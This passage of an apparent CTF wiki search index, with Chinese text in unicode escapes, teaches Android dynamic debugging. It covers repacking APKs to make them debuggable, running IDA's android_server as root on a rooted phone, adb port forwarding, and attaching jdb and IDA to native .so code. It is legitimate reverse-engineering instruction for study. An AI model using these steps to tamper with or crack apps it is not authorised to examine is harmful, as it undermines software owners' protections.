Profiling\u3001\u5e7f\u64ad\u72b6\u6001\u4fe1\u606f\u3001\u6a21\u62df\u7535\u8bdd\u547c\u53eb\u3001\u63a5\u6536SMS\u7b49\u529f\u80fd\u3002\u8be5\u5de5\u5177\u4e00\u822c\u4f4d\u4e8eAndroid SDK\u7684tools\u76ee\u5f55\u4e0b\uff0c\u5176\u4e2dddms.bat\u5c31\u662f\u7528\u6765\u542f\u52a8DDMS\u7684\u3002DDMS\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u529f\u80fd\u4e3b\u8981\u662f \u6587\u4ef6\u6d4f\u89c8\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5e76\u5206\u6790\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5bf9\u6587\u4ef6\u7684\u751f\u6210\uff0c\u4fee\u6539\uff0c\u5220\u9664\u64cd\u4f5c\u3002 Logcat\uff0c\u53ef\u4ee5\u8f93\u51fa\u8f6f\u4ef6\u7684\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u3002 Method Profiling\uff0c\u53ef\u4ee5\u8ddf\u8e2a\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 IDEA/Android Studio \u00b6 \u5b89\u88c5 smaliidea \u63d2\u4ef6\uff0c\u52a8\u6001\u8c03\u8bd5smali\u3002 IDA Pro \u00b6 \u543e\u7231\u7834\u89e3\u3002","title":"\u7b80\u8ff0"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#android","text":"","title":"Android \u52a8\u6001\u8c03\u8bd5"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#android_1","text":"\u4e00\u822c\u6765\u8bf4\uff0cAndroid \u6839\u636e\u5982\u4e0b\u7684\u987a\u5e8f\u6765\u5224\u65ad\u4e00\u4e2a\u5e94\u7528\u662f\u5426\u53ef\u4ee5\u88ab\u8c03\u8bd5 \u68c0\u6d4b boot.img \u4e2d\u7684 ro.debuggable \u662f\u5426\u4e3a1\uff0c\u4e3a 1 \u7684\u8bdd\uff0c\u624b\u673a\u4e2d\u7684\u4efb\u4f55\u5e94\u7528\u5747\u53ef\u4ee5\u8c03\u8bd5\u3002 \u5426\u5219\uff0c\u68c0\u6d4b\u5bf9\u5e94\u5e94\u7528\u4e2d AndroidManifest.xml \u4e2d \\<application> \u5143\u7d20\u4e2d\u662f\u5426\u5305\u542b\u4e86android:debuggable=\"true\"\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u624d\u4f1a\u5f00\u542f\u8c03\u8bd5\u652f\u6301\u3002 \u81ea\u7136\uff0c\u6211\u4eec\u4e5f\u5c31\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u4f7f\u5f97\u4e00\u4e2a\u5e94\u7528\u53ef\u4ee5\u88ab\u8c03\u8bd5 \u5c06\u4e00\u4e2a apk \u6587\u4ef6\u89e3\u5305\uff0c\u5728 \\<application> \u5143\u7d20\u4e2d\u6dfb\u52a0 android:debuggable=\"true\"\uff0c\u7136\u540e\u91cd\u6253\u5305\uff0c\u7b7e\u540d\u3002 \u4fee\u6539 boot.img \u4e2d\u7684 ro.debuggable \u4e3a 1\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u56e0\u4e3a\u524d\u8005\u9700\u8981\u6211\u4eec\u6bcf\u6b21\u90fd\u9700\u8981\u4fee\u6539\u5e94\u7528\uff0c\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6211\u4eec\u66f4\u503e\u5411\u4e8e\u540e\u8005\uff0c\u3002 \u5bf9\u4e8e\u540e\u8005\u6765\u8bf4\uff0c\u6211\u4eec\u9700\u8981 root \u624b\u673a\uff0c\u5e76\u5237\u5165\u76f8\u5173\u7684\u955c\u50cf\u3002\uff08 \uff01\uff01\u627e\u4e00\u7bc7\u5408\u9002\u7684\u6587\u7ae0\uff01\uff01 \uff09 \u6b64\u5916\uff0c\u7531 Andoird AVD \u751f\u6210\u7684\u6a21\u62df\u5668\u9ed8\u8ba4\u60c5\u51b5\u4e0b ro.debuggable \u88ab\u8bbe\u7f6e\u4e3a1\u3002 ro.debuggable \u7684\u503c\u53ef\u4ee5\u6839\u636e\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u8be2 adb shell getprop ro.debuggable","title":"Android \u8c03\u8bd5\u57fa\u672c\u539f\u7406"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#_1","text":"","title":"\u57fa\u672c\u8c03\u8bd5\u5de5\u5177"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ddms","text":"DDMS\uff08Dalvik Debug Monitor Service\uff09\u662fDalvik\u865a\u62df\u673a\u8c03\u8bd5\u76d1\u63a7\u670d\u52a1\uff0c\u53ef\u4ee5\u76d1\u89c6Android\u7a0b\u5e8f\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u72b6\u6001\u4ee5\u53ca\u7ed3\u679c\uff0c\u53ef\u4ee5\u5927\u5927\u52a0\u5feb\u6211\u4eec\u7684\u7a0b\u5e8f\u5206\u6790\u6548\u7387\u3002\u8fd9\u662f\u4e00\u6b3e\u7531Android SDK\u63d0\u4f9b\u7684\u5de5\u5177\uff0c\u5176\u4e2d\u6709\u8bbe\u5907\u622a\u5c4f\uff0c\u67e5\u770b\u8fd0\u884c\u7684\u7ebf\u7a0b\u4fe1\u606f\u3001\u6587\u4ef6\u6d4f\u89c8\u3001Logcat\u3001Method Profiling\u3001\u5e7f\u64ad\u72b6\u6001\u4fe1\u606f\u3001\u6a21\u62df\u7535\u8bdd\u547c\u53eb\u3001\u63a5\u6536SMS\u7b49\u529f\u80fd\u3002\u8be5\u5de5\u5177\u4e00\u822c\u4f4d\u4e8eAndroid SDK\u7684tools\u76ee\u5f55\u4e0b\uff0c\u5176\u4e2dddms.bat\u5c31\u662f\u7528\u6765\u542f\u52a8DDMS\u7684\u3002DDMS\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u529f\u80fd\u4e3b\u8981\u662f \u6587\u4ef6\u6d4f\u89c8\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5e76\u5206\u6790\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5bf9\u6587\u4ef6\u7684\u751f\u6210\uff0c\u4fee\u6539\uff0c\u5220\u9664\u64cd\u4f5c\u3002 Logcat\uff0c\u53ef\u4ee5\u8f93\u51fa\u8f6f\u4ef6\u7684\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u3002 Method Profiling\uff0c\u53ef\u4ee5\u8ddf\u8e2a\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002","title":"DDMS"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ideaandroid-studio","text":"\u5b89\u88c5 smaliidea \u63d2\u4ef6\uff0c\u52a8\u6001\u8c03\u8bd5smali\u3002","title":"IDEA/Android Studio"},{"location":"android/basic_reverse/dynamic/dynamic_debug/#ida-pro","text":"\u543e\u7231\u7834\u89e3\u3002","title":"IDA Pro"},{"location":"android/basic_reverse/dynamic/ida_native_debug/","text":"IDA \u52a8\u6001\u8c03\u8bd5\u539f\u751f\u5c42\u7a0b\u5e8f \u00b6 \u8fd9\u91cc\u6211\u4eec\u4f1a\u4ecb\u7ecd\u5982\u4f55\u8c03\u8bd5\u4ee5\u4e0b\u79cd\u7c7b\u7684\u7a0b\u5e8f \u57fa\u672c\u7684\u539f\u751f\u5c42\u7a0b\u5e8f\uff0c\u5373\u7b80\u5355\u7684 C/C++ \u7a0b\u5e8f\u3002 \u539f\u751f so \u7a0b\u5e8f \u5fc5\u5907\u5de5\u5177 \u00b6 \u5df2\u7ecfroot\u7684\u624b\u673a IDA \u57fa\u672c\u539f\u7406 \u00b6 \u5728\u4f7f\u7528 ida \u52a8\u6001\u8c03\u8bd5\u539f\u751f\u5c42\u7a0b\u5e8f\u65f6\uff0c\u4e3b\u8981\u4f1a\u4f7f\u7528\u5230 android_server \u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u4f1a\u4f7f\u7528 ptrace \u6280\u672f\u6ce8\u5165\u5230\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u4e2d\u3002 \u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a status \u6587\u4ef6\uff0c\u5176\u4e2d\u6709\u4e00\u5b57\u6bb5 TracerPid \u7528\u6765\u6807\u8bc6\u8be5\u8fdb\u7a0b\u662f\u88ab\u54ea\u4e2a\u8fdb\u7a0b ptrace \u4e86\u3002\u5982\u679c\u6ca1\u6709\u88ab\u5176\u4ed6\u8fdb\u7a0b ptrace\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de\u5bf9\u5e94\u8fdb\u7a0b\u7684 pid\u3002 \u57fa\u672c\u73af\u5883\u642d\u5efa \u00b6 \u65e0\u8bba\u662f\u8c03\u8bd5\u4ec0\u4e48\u539f\u751f\u5c42\u7a0b\u5e8f\uff0c\u57fa\u672c\u7684\u73af\u5883\u642d\u5efa\u90fd\u662f\u7c7b\u4f3c\u7684\uff0c\u9700\u8981\u786e\u4fdd IDA \u4e0e\u624b\u673a\u901a\u4fe1\u6b63\u5e38\u3002 \u4e0a\u4f20 android_server \u6587\u4ef6(\u5728 ida \u7684 dbgsrv \u6587\u4ef6\u5939\u4e0b)\uff0c\u5e76\u4fee\u6539\u76f8\u5e94\u6743\u9650\u4f7f\u5176\u53ef\u4ee5\u6267\u884c adb push android_server /data/local/tmp/ adb shell chmod 755 /data/local/tmp/android_server \u5f00\u542f android_server\uff0c\u5176\u4f1a\u76d1\u542c 23946 \u7aef\u53e3(\u4ee5 root \u6743\u9650\u8fd0\u884c) adb shell # \u8fdb\u5165adb su # \u5207\u6362root ./data/local/tmp/android_server #\u542f\u52a8android_server 3. \u5efa\u7acb\u672c\u5730\u8ba1\u7b97\u673a 23496 \u7aef\u53e3\u4e0e\u624b\u673a\u7aef\u53e3 23946 \u7684\u901a\u4fe1\u3002\u5f53 PC \u6709\u5ba2\u6237\u7aef\u8fde\u63a5 23946 \u7aef\u53e3\u65f6\uff0c\u5176\u53d1\u9001\u7684\u4fe1\u606f\u90fd\u5c06\u88ab\u8f6c\u53d1\u5230\u624b\u673a\u7684\u76f8\u5e94\u7684\u7aef\u53e3\uff0c\u8fd9\u65f6 android_server \u5c31\u6536\u5230\u76f8\u5e94\u7684\u6570\u636e\uff0c\u4ece\u800c\u4f7f\u5f97 IDA \u53ef\u4ee5\u8c03\u8bd5\u7a0b\u5e8f\u3002\u524d\u9762\u7684 tcp \u7684\u7aef\u53e3\u6307\u7684\u662f\u672c\u5730 PC \u7684\u7aef\u53e3\uff0c\u540e\u9762\u7684\u6307\u7684\u662f\u624b\u673a\u7684\u7aef\u53e3\u3002 adb forward tcp:23946 tcp:23946 \u6ce8\u610f\uff1a \u5176\u5b9e\u8fd9\u4e2a\u8fde\u63a5\u5efa\u7acb\u7684\u662f adb server \u4e0e\u4e0e\u624b\u673a\u4e0a adbd \u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u6240\u4ee5\u5176\u901a\u4fe1\u5927\u6982\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 IDA\u2194adb server<--->adbd<---->android_server \u200b \u7535\u8111 | \u624b\u673a \u5176\u4e2d\uff0c\u7b2c\u4e00\u6b65\u53ea\u9700\u8981\u6267\u884c\u4e00\u6b21\uff0c\u540e\u9762\u5c31\u4e0d\u9700\u8981\u518d\u6b21\u6267\u884c\u3002\u800c\u7b2c 2-3 \u6b65\u6bcf\u6b21\u90fd\u5f97\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u811a\u672c\uff0c\u5e76\u5c06\u811a\u672c\u7684\u8def\u5f84\u653e\u5728\u7cfb\u7edf\u7684 path \u73af\u5883\u53d8\u91cf\u4e0b\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\u76f4\u63a5\u6267\u884c\u3002 \u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5-\u6cd51 \u00b6 \u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u6307\u7684\u662f\u666e\u901a\u7684\u7f16\u8bd1\u4e3a arm \u6c47\u7f16\u7684 c/c++ \u7a0b\u5e8f\u3002 \u6dfb\u52a0\u7a0b\u5e8f \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 http://www.52pojie.cn/thread-554068-1-1.html \u4e2d\u7684 debugnativeapp \u4e3a\u4f8b\u5b50\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u628a\u539f\u751f\u7a0b\u5e8f\u653e\u5230 android \u8bbe\u5907\u4e2d\uff0c\u5e76\u4fee\u6539\u5176\u6743\u9650\uff0c\u4f7f\u5176\u53ef\u4ee5\u88ab\u6267\u884c\u3002\u5982\u4e0b adb push debugnativeapp /data/local/tmp/ adb shell chmod 755 /data/local/tmp/debugnativeapp \u542f\u52a8\u8c03\u8bd5 \u00b6 \u6839\u636e\u539f\u751f\u5c42\u7a0b\u5e8f\u7684\u4f4d\u6570\u9009\u62e9\u76f8\u5e94\u7684 ida\uff0c\u7136\u540e\u9009\u62e9 Debugger-Run-RemoteArmLinux/Android debugger\uff0c\u5982\u4e0b\u754c\u9762 \u5176\u4e2d\uff0c\u91cd\u8981\u7684\u53c2\u6570\u610f\u4e49\u5982\u4e0b Application \u88ab\u8c03\u8bd5\u7a0b\u5e8f\u5728\u624b\u673a\u4e0a\u7684\u7edd\u5bf9\u8def\u5f84\u3002 Directory \u88ab\u8c03\u8bd5\u7a0b\u5e8f\u5728\u624b\u673a\u4e2d\u7684\u76ee\u5f55 Hostname \u5373\u6211\u4eec\u4e0e\u54ea\u4e2a\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u548c\u672c\u5730PC\u8fdb\u884c\u901a\u4fe1\u3002 \u5176\u4e2d Debug options \u9009\u62e9\u5982\u4e0b \u4e3b\u8981\u662f\u9009\u62e9\u4e86\u4e09\u4e2a Events\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5165\u53e3\u70b9\uff0c\u7ebf\u7a0b\u542f\u52a8\u65f6\uff0clibrary\u52a0\u8f7d\u65f6\u81ea\u52a8\u505c\u6b62\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u90fd\u8fdb\u884c\u9009\u62e9\u3002 \u542f\u52a8\u7a0b\u5e8f\u540e\uff0c\u5982\u4e0b \u6ce8\uff1a \u5982\u679c\u53d1\u73b0can not load plugin \uff0c\u90a3\u53ef\u80fd\u662f\u624b\u673a\u6ca1\u6709root\u3002 \u5982\u679c\u9047\u5230\u4ee5\u4e0b\u95ee\u9898\uff0c\u76f4\u63a5cancel\u5c31\u597d\u3002\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u6e05\u695a\u3002 \u5982\u679c\u9047\u5230error: only position independent executables (PIE) are supported.\u4e00\u822c\u662f\u56e0\u4e3aandroid\u624b\u673a\u7684\u7248\u672c\u5927\u4e8e5\uff0c\u53ef\u4ee5\u5c1d\u8bd5 \u4f7f\u7528android_server\u7684PIE\u7248\u672c \u5229\u7528010Editor\u5c06\u53ef\u6267\u884cELF\u6587\u4ef6\u7684header\u4e2d\u7684elf header\u5b57\u6bb5\u4e2d\u7684e_type\u6539\u4e3aET_DYN(3)\u3002 so\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5 \u00b6 \u5bf9\u4e8e so \u539f\u751f\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8fd9\u548c\u666e\u901a\u539f\u751f\u7a0b\u5e8f\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u7684\u5730\u65b9\u5462\uff1f\u81ea\u7136\u662f\u6709\u7684\uff0cso\u6587\u4ef6\u4e0d\u80fd\u5355\u72ec\u8fd0\u884c\u3002\u4e00\u822c\u662f\u5176\u5b83\u7a0b\u5e8f\u8c03\u7528 so \u6587\u4ef6\u4e2d\u7684\u57fa\u672c\u67d0\u4e9b\u51fd\u6570\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u80fd\u76f4\u63a5\u91c7\u7528\u4e0a\u9762 run \u7684\u65b9\u5f0f\u4e86\u3002\u4e00\u822c\u6765\u8bf4\uff0candroid \u4e2d so \u6587\u4ef6\u90fd\u662f\u4f9d\u8d56\u4e8e apk \u6587\u4ef6\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 http://www.52pojie.cn/thread-554068-1-1.html \u4e2d\u7684 debugjniso.apk \u4e3a\u4f8b\u5b50\u3002 \u9996\u5148\uff0c\u5fc5\u987b\u642d\u5efa\u57fa\u672c\u8c03\u8bd5\u73af\u5883\u3002 \u5b89\u88c5\u7a0b\u5e8f \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5c06 apk \u5b89\u88c5\u5230\u624b\u673a\u4e0a\u3002 adb install debugjniso.apk \u8c03\u8bd5\u6a21\u5f0f\u542f\u52a8app \u00b6 \u5176\u6b21\uff0c\u6211\u4eec\u9700\u8981\u4ee5 \u8c03\u8bd5\u6a21\u5f0f\u542f\u52a8\u7a0b\u5e8f \uff0c\u8fd9\u6837\uff0c\u624d\u53ef\u4ee5\u65b9\u4fbf IDA \u6765\u6355\u6349\u5230\u76f8\u5e94\u7684\u7a0b\u5e8f\u5e76\u5bf9\u5176\u8fdb\u884c attach\u3002 shell adb shell am start -D -n packagename/.MainActivity attach\u7a0b\u5e8f \u00b6 \u542f\u52a8 IDA pro\uff0c\u70b9\u51fbDebugger-Attach-RemoteArmLinux/Android debugger\uff0cHostname \u586b localhost\uff0cport \u9ed8\u8ba4\u5c31\u662f 23946 \u7aef\u53e3\u3002\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u672c\u5730\u7535\u8111\u7684\u76d1\u542c\u7aef\u53e3\u3002\u5982\u4e0b \u70b9\u51fb ok\uff0c\u542f\u52a8\u8c03\u8bd5 \u6ce8\u610f\uff1a \u5982\u679c\u6700\u540e\u51fa\u73b0\u53ea\u6709\u4e00\u4e2a\u7a0b\u5e8f /bin/sh \u53ef\u4ee5\u88ab attach\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u4ee5 root \u6743\u9650\u8fd0\u884c android_server \u7a0b\u5e8f\u3002 \u5229\u7528 ctrl+f \u5feb\u901f\u5b9a\u4f4d\u5e76\u9009\u62e9\u76f8\u5e94\u7684\u8fdb\u7a0b\uff0c\u5982\u4e0b \u7136\u540eok\u786e\u5b9a\u5373\u53ef\u3002 \u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5df2\u7ecf attach \u6210\u529f\u4e86\u3002 \u8fd9\u65f6\u5019\u6211\u4eec\u518d\u70b9\u51fb Debugger-Debugger options\uff0c\u8bbe\u7f6e\u76f8\u5173\u9009\u9879\u5982\u4e0b \u610f\u601d\u7c7b\u540c\u4e8e\u539f\u751f\u7a0b\u5e8f\u3002 \u4e3a\u4ec0\u4e48\u8fd9\u65f6\u5019\u624d\u9009\u62e9\u8981\u8bbe\u4e0b\u76f8\u5e94\u7684\u65ad\u70b9\uff0c\u662f\u56e0\u4e3a\u5982\u679c\u5728\u5f00\u59cbattach\u7684\u65f6\u5019\u5c31\u8bbe\u7f6e\u7684\u8bdd\uff0c\u5230\u8fd9\u91cc\u5176\u5b9e\u662f\u6ca1\u6709\u7684\u3002\u5927\u5bb6\u53ef\u4ee5\u8bd5\u8bd5\u3002 \u6062\u590d app \u6267\u884c \u00b6 \u8fd9\u65f6\u5019\uff0capp \u7684\u754c\u9762\u662f wait for debugger\uff0c\u6211\u4eec\u4e5f\u5df2\u7ecf attach \u4e0a\u53bb\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u5c31\u9700\u8981\u8ba9\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\u4e86\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6253\u5f00 ddms \u6765\u9009\u4e2d\u6211\u4eec\u8981\u8c03\u8bd5\u7684\u8fdb\u7a0b\u3002 \u8fd9\u91cc\u5176\u5b9e\u76f8\u5f53\u4e8e\u76f4\u63a5\u6267\u884c\u4e86 # \u663e\u793a\u624b\u673a\u6240\u6709\u53ef\u4f9b\u8c03\u8bd5\u7684\u7528\u6237\u8fdb\u7a0b adb jdwp # \u5728PC\u7684xxx\u7aef\u53e3\u4e0e\u624b\u673a\u7684\u76f8\u5e94\u7aef\u53e3\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u65b9\u4fbf\u901a\u4fe1 adb forward tcp:xxx jdwp:<pid> \u4e4b\u6240\u4ee5\u4e0d\u4f7f\u7528\u547d\u4ee4\u53bb\u6267\u884c\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u8fd8\u5f97\u81ea\u5df1\u53bb\u786e\u5b9a\u6211\u4eec\u7684 apk \u7684\u8fdb\u7a0b\u53f7\uff0c\u8fd9\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u901a\u4fe1\u8fc7\u7a0b \u6b64\u65f6\uff0c\u6211\u4eec\u7684\u7535\u8111\u5df2\u7ecf\u4e0e\u624b\u673a\u7684 app \u865a\u62df\u673a\u4e4b\u95f4\u5efa\u7acb\u4e86\u901a\u4fe1\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 jdb \u5728 java \u5c42\u6765\u5c06\u6211\u4eec\u7684 apk \u5e94\u7528 attach \u5230\u6211\u4eec\u7684\u7535\u8111\u4e0a\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u7684\u547d\u4ee4\u3002 jdb -connect com.sun.jdi.SocketAttach:hostname = localhost,port = xxx \u5176\u4e2d xxx \u5c31\u662f\u6211\u4eec\u5728 ddms \u770b\u5230\u7684 8700 \u7aef\u53e3\uff0c\u4e00\u822c\u9ed8\u8ba4\u5c31\u662f\u8fd9\u4e2a\u3002\u6267\u884c\u4e4b\u540e C: \\U sers \\i romise \u03bb jdb.bat jdb -connect com.sun.jdi.SocketAttach:hostname = 127 .0.0.1,port = 8700 \u8bbe\u7f6e\u672a\u6355\u83b7\u7684java.lang.Throwable \u8bbe\u7f6e\u5ef6\u8fdf\u7684\u672a\u6355\u83b7\u7684java.lang.Throwable \u6b63\u5728\u521d\u59cb\u5316jdb... > \u6211\u4eec\u518d\u6b21\u770b\u4e00\u4e0b\u6211\u4eec\u7684\u624b\u673a\uff0c \u6b64\u65f6\uff0c\u5e94\u7528\u5df2\u7ecf\u53c8\u7ee7\u7eed\u8fd0\u884c\u4e86\uff0c\u4e0d\u518d\u662f\u4e4b\u524d\u7684 wait for debugger \u4e86\u3002 \u786e\u5b9a\u539f\u751f\u51fd\u6570\u5730\u5740 \u00b6 \u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u6253\u5f00\u4e00\u4e2a ida\uff0c\u5bfc\u5165\u8be5 apk \u7684 so \u5e93\uff0c\u7136\u540e\u5728 export \u4e2d\u5bfb\u627e\u6211\u4eec\u7684\u51fd\u6570\uff0c\u5982\u4e0b \u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 0xc38\u3002 \u6211\u4eec\u518d\u5728\u4e4b\u524d\u7684\u8c03\u8bd5\u7684 IDA \u4e2d\u8fd0\u884c F9 \u76f4\u5230\u600e\u4e48\u6309\u90fd\u4e0d\u518d\u8fd0\u884c\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u7a0b\u5e8f\u65ad\u5728 linker \u5904 \u6b64\u65f6\uff0c\u6211\u4eec \u70b9\u51fb app \u754c\u9762\u7684\u8bbe\u7f6e\u6807\u9898\u6309\u94ae \uff08\u4e4b\u6240\u4ee5\u8981\u6309\u8fd9\u4e2a\uff0c\u662f\u56e0\u4e3a\u5728\u8be5\u51fd\u6570\u4e2d\u8c03\u7528\u4e86\u539f\u751f API\uff09\uff0c\u518d\u6b21\u89c2\u5bdfIDA\uff0c\u53ef\u4ee5\u770b\u51fa\u8be5 so \u5e93\u5df2\u7ecf\u88ab\u52a0\u8f7d\u8fdb\u5165 B3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex B39B9000: loaded /system/lib/hw/gralloc.msm8974.so B39B2000: loaded /system/lib/libmemalloc.so B39AA000: loaded /system/lib/libqdutils.so B3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so \u8fd9\u65f6\uff0c\u6211\u4eec\u5229\u7528 ctrl+s \u5b9a\u4f4d\u5230\u8be5\u5e93\u7684\u8d77\u59cb\u5730\u5740\u5904 0xB3B00000\u3002\u7136\u540e\u6839\u636e \u7edd\u5bf9\u5730\u5740=\u57fa\u5730\u5740+\u76f8\u5bf9\u504f\u79fb \u5f97\u5230 jnistring \u7684\u5730\u5740\u3002 \u89c2\u5bdf\u7ed3\u679c \u00b6 \u6309\u4e0b g\uff0c\u7136\u540e\u8f93\u5165 +0xC38 \uff0c\u70b9\u51fb ok \u5373\u53ef\u8df3\u8f6c\u81f3\u8be5\u51fd\u6570 libdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString libdebugjniso.so:B3B00C38 LDR R1, =(unk_B3B02148 - 0xB3B00C4C) libdebugjniso.so:B3B00C3C STMFD SP!, {R4,LR} libdebugjniso.so:B3B00C40 LDR R3, [R0] libdebugjniso.so:B3B00C44 ADD R1, PC, R1 ; unk_B3B02148 libdebugjniso.so:B3B00C48 MOV LR, PC \u6211\u4eec\u5728\u6b64\u51fd\u6570\u7684\u5f00\u59cb\u5904 F2 \u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u518d\u6b21F9\u6267\u884c\u7a0b\u5e8f\uff0c\u540c\u65f6\u89c2\u770b\u624b\u673a\uff0c\u5c31\u53ef\u4ee5\u53d1\u73b0app\u7684\u6807\u9898\u53d8\u6210\u4e86 \u4f60\u597d\uff01Nativemethod \u3002 \u5230\u6b64\uff0cso \u539f\u751f\u7a0b\u5e8f\u7684\u57fa\u672c\u8c03\u8bd5\u6b65\u9aa4\u5c31\u7ed3\u675f\u4e86\u3002 \u6ce8\uff1a \u5982\u679c\u4e2d\u95f4\u51fa\u73b0\u4e86add map\u7684\u5bf9\u8bdd\u6846\u76f4\u63a5\u70b9\u51fbCancel\uff0c\u7136\u540eapply\u5373\u53ef\u3002 \u6ce8\u610f\u4e8b\u9879 \u00b6 \u5f53\u4f7f\u7528\u6a21\u62df\u5668\u8c03\u8bd5 apk \u51fa\u73b0\u5f02\u5e38\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u5e94\u7528\u68c0\u6d4b\u4e86\u662f\u5426\u8fd0\u884c\u5728\u6a21\u62df\u5668\u73af\u5883\u4e0b\uff0c\u8003\u8651\u4f7f\u7528\u624b\u673a\u3002 \u5f53\u4f7f\u7528\u771f\u673a\u8c03\u8bd5 apk \u65f6\uff0c\u4e5f\u6709\u53ef\u80fd\u4f1a\u9047\u5230\u5f02\u5e38\uff0c\u5361\u5728\u67d0\u4e00\u6761\u6307\u4ee4\u4e0a\uff0c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u6267\u884c\u8fd9\u6761\u6307\u4ee4\uff0c\u7136\u540e\u5c06 PC \u8bbe\u7f6e\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002 \u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5-\u6cd52 \u00b6 \u5f85\u8865\u5145\u3002 \u591a\u7ebf\u7a0b\u8c03\u8bd5 \u00b6 \u53c2\u8003\u9605\u8bfb \u00b6 http://www.52pojie.cn/thread-554068-1-1.html https://www.kanxue.com/chm.htm?id=10296&pid=node1000944","title":"Android \u52a8\u6001\u8c03\u8bd5 So"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#ida","text":"\u8fd9\u91cc\u6211\u4eec\u4f1a\u4ecb\u7ecd\u5982\u4f55\u8c03\u8bd5\u4ee5\u4e0b\u79cd\u7c7b\u7684\u7a0b\u5e8f \u57fa\u672c\u7684\u539f\u751f\u5c42\u7a0b\u5e8f\uff0c\u5373\u7b80\u5355\u7684 C/C++ \u7a0b\u5e8f\u3002 \u539f\u751f so \u7a0b\u5e8f","title":"IDA \u52a8\u6001\u8c03\u8bd5\u539f\u751f\u5c42\u7a0b\u5e8f"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_1","text":"\u5df2\u7ecfroot\u7684\u624b\u673a IDA","title":"\u5fc5\u5907\u5de5\u5177"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_2","text":"\u5728\u4f7f\u7528 ida \u52a8\u6001\u8c03\u8bd5\u539f\u751f\u5c42\u7a0b\u5e8f\u65f6\uff0c\u4e3b\u8981\u4f1a\u4f7f\u7528\u5230 android_server \u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u4f1a\u4f7f\u7528 ptrace \u6280\u672f\u6ce8\u5165\u5230\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f\u4e2d\u3002 \u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a status \u6587\u4ef6\uff0c\u5176\u4e2d\u6709\u4e00\u5b57\u6bb5 TracerPid 